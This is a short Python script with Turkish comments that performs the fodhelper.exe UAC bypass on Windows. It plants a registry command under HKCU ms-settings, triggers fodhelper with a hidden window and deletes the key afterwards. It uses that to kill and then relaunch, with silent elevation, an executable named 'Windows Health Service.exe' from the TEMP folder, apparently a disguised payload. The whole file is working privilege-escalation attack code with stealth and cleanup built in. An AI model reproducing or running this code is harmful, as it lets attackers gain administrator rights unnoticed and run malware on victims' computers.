import os
import winreg
import time
import ctypes
import sys

# Ayar: Görev yöneticisindeki tam isim
target_process_name = "Windows Health Service.exe"

def run_completely_invisible(cmd_path):
    """Windows Shell32 API ile fodhelper'ı tamamen gizli başlatır."""
    try:
        # 0 = SW_HIDE (Pencereyi gizle)
        ctypes.windll.shell32.ShellExecuteW(None, "open", cmd_path, None, None, 0)
    except:
        pass

def uac_bypass_action(exe_to_run, args=""):
    """
    Kayıt defterine CMD yazmak yerine doğrudan EXE'yi yazar.
    Bu, yüksek yetkili CMD penceresinin açılmasını engeller.
    """
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    try:
        # Kayıt defteri hazırlığı
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            # ÖNEMLİ: CMD kullanmıyoruz, doğrudan EXE yolunu ve parametrelerini veriyoruz
            full_command = f'{exe_to_run} {args}'.strip()
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, full_command)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # fodhelper'ı tetikle
        run_completely_invisible("fodhelper.exe")
        
        # İşlem süresi (Kritik: Çok kısa tutarsan kayıt defteri silindiği için exe açılmaz)
        time.sleep(5)
        
        # Temizlik
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

if __name__ == "__main__":
    # --- 1. ADIM: ESKİSİNİ KAPAT ---
    # Doğrudan taskkill.exe'yi çağırıyoruz (cmd /c olmadan)
    system32 = os.path.join(os.environ['SystemRoot'], 'System32')
    taskkill_path = os.path.join(system32, 'taskkill.exe')
    
    uac_bypass_action(taskkill_path, f'/F /IM "{target_process_name}" /T')

    # --- 2. ADIM: YENİSİNİ AÇ ---
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_process_name)

    if os.path.exists(full_path):
        # Tırnak işaretlerini f-string içinde yönetiyoruz
        uac_bypass_action(f'"{full_path}"')

    sys.exit()
